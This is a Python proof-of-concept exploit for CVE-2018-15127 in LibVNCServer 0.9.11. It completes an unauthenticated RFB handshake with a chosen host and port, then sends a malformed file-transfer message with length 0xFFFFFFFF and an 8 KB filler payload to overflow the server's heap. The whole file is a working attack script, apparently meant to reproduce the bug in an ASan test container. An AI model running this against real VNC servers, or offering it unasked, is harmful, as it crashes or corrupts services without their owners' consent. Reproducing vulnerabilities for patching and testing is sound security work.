#!/usr/bin/env python3
"""
PoC for CVE-2018-15127 - LibVNCServer 0.9.11 heap buffer overflow.

Performs a complete RFB 3.8 handshake (no-auth path), then sends a
malicious rfbFileTransfer message (type=7) with length=0xFFFFFFFF
followed by a multi-KB payload, triggering a heap-buffer-overflow WRITE
in rfbProcessFileTransferReadBuffer() that ASan will catch and abort on.

Wire layout references:
  - RFB Protocol 3.8: https://www.rfc-editor.org/rfc/rfc6143
  - rfbFileTransferMsg (12 bytes):
      byte 0:    type         = 7 (rfbFileTransfer)
      byte 1:    contentType  = 1 (rfbDirContentRequest)
      byte 2:    contentParam = 1 (rfbRDirContent)
      byte 3:    pad          = 0
      bytes 4-7: size         = 0 (uint32 big-endian)
      bytes 8-11:length       = 0xFFFFFFFF (uint32 big-endian)

Usage:
    python3 poc_cve_2018_15127.py <host> <port>
    python3 poc_cve_2018_15127.py 127.0.0.1 15900
"""

import socket
import struct
import sys
import time


def recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError(f"Connection closed after {len(buf)}/{n} bytes")
        buf += chunk
    return buf


def do_rfb_handshake(sock: socket.socket) -> None:
    """
    Perform RFB 3.8 handshake with security type None (no password).

    Server -> Client: "RFB 003.00x\n"  (12 bytes, ProtocolVersion)
    Client -> Server: "RFB 003.008\n"  (12 bytes)
    Server -> Client: [count=1][type=1] (2 bytes, SecurityTypes)
    Client -> Server: [1]              (1 byte, chosen security type)
    Server -> Client: [result=0]       (4 bytes, SecurityResult OK)
    Client -> Server: [shared=1]       (1 byte, ClientInit)
    Server -> Client: ServerInit       (20+ bytes: width/height/pixfmt/name)
    """
    # Step 1: receive server ProtocolVersion
    server_version = recv_exact(sock, 12)
    print(f"[*] Server version: {server_version!r}")
    assert server_version.startswith(b"RFB 003."), f"Unexpected banner: {server_version!r}"

    # Step 2: send client ProtocolVersion (request 3.8)
    sock.sendall(b"RFB 003.008\n")
    print("[*] Sent: RFB 003.008")

    # Step 3: receive security types list  [count u8][type u8 ...]
    count_byte = recv_exact(sock, 1)
    count = count_byte[0]
    if count == 0:
        # count=0 means error; read the reason string length + string
        reason_len_bytes = recv_exact(sock, 4)
        reason_len = struct.unpack(">I", reason_len_bytes)[0]
        reason = recv_exact(sock, reason_len)
        raise RuntimeError(f"Server returned error before security list: {reason!r}")

    sec_types = recv_exact(sock, count)
    print(f"[*] Security types offered ({count}): {list(sec_types)}")
    if 1 not in sec_types:
        raise RuntimeError(f"Security type None (1) not offered: {list(sec_types)}")

    # Step 4: choose security type 1 (None)
    sock.sendall(b"\x01")
    print("[*] Sent: security type 1 (None)")

    # Step 5: receive SecurityResult (u32 big-endian; 0 = OK)
    result_bytes = recv_exact(sock, 4)
    result = struct.unpack(">I", result_bytes)[0]
    print(f"[*] SecurityResult: {result}")
    if result != 0:
        raise RuntimeError(f"Security handshake failed, result={result}")

    # Step 6: send ClientInit (1 byte; shared=1 => allow multiple clients)
    sock.sendall(b"\x01")
    print("[*] Sent: ClientInit shared=1")

    # Step 7: receive ServerInit
    # Format: width(u16) height(u16) pixelFormat(16 bytes) nameLength(u32) name(...)
    server_init_hdr = recv_exact(sock, 24)
    width, height = struct.unpack(">HH", server_init_hdr[:4])
    name_len = struct.unpack(">I", server_init_hdr[20:24])[0]
    name = recv_exact(sock, name_len)
    print(f"[*] ServerInit: {width}x{height} name={name!r}")


def send_filetransfer_trigger(sock: socket.socket) -> None:
    """
    Send the malicious rfbFileTransfer message that triggers CVE-2018-15127.

    rfbFileTransferMsg layout (rfbserver.h / rfbproto.h):
        u8  type        = 7   (rfbFileTransfer)
        u8  contentType = 1   (rfbDirContentRequest)
        u8  contentParam= 1   (rfbRDirContent)
        u8  pad         = 0
        u32 size        = 0   (big-endian, server Swap32IfLE -> host)
        u32 length      = 0xFFFFFFFF (big-endian)

    Then immediately write a payload so rfbReadExact() overflows the
    malloc(0) chunk before the server can drain the socket.
    """
    msg = struct.pack(">BBBBI I",
        7,          # type = rfbFileTransfer
        1,          # contentType = rfbDirContentRequest
        1,          # contentParam = rfbRDirContent
        0,          # pad
        0,          # size
        0xFFFFFFFF, # length -> triggers malloc(0) then read of 4GB
    )
    # Actual payload bytes: 8 KB of 0x41 ('A') is enough to corrupt the heap
    # and trigger the ASan abort well before rfbReadExact times out.
    payload = b"\x41" * 8192

    print(f"[*] Sending malicious rfbFileTransfer msg (12 bytes) + {len(payload)} byte payload")
    sock.sendall(msg + payload)
    print("[*] Payload sent - waiting for server to crash...")


def main() -> None:
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print(f"[*] CVE-2018-15127 PoC targeting {host}:{port}")
    print("[*] Heap buffer overflow in rfbProcessFileTransferReadBuffer (LibVNCServer 0.9.11)")
    print()

    with socket.create_connection((host, port), timeout=10) as sock:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        try:
            do_rfb_handshake(sock)
        except Exception as e:
            print(f"[-] Handshake failed: {e}")
            sys.exit(1)

        print()
        send_filetransfer_trigger(sock)

        # Keep socket open ~2 s so the server finishes its read attempt
        # and ASan aborts (rather than getting ECONNRESET first).
        time.sleep(2)

    print()
    print("[*] Socket closed. Check 'docker logs <container>' for the ASan abort trace.")
    print("[*] Expected: heap-buffer-overflow WRITE at rfbProcessFileTransferReadBuffer")


if __name__ == "__main__":
    main()
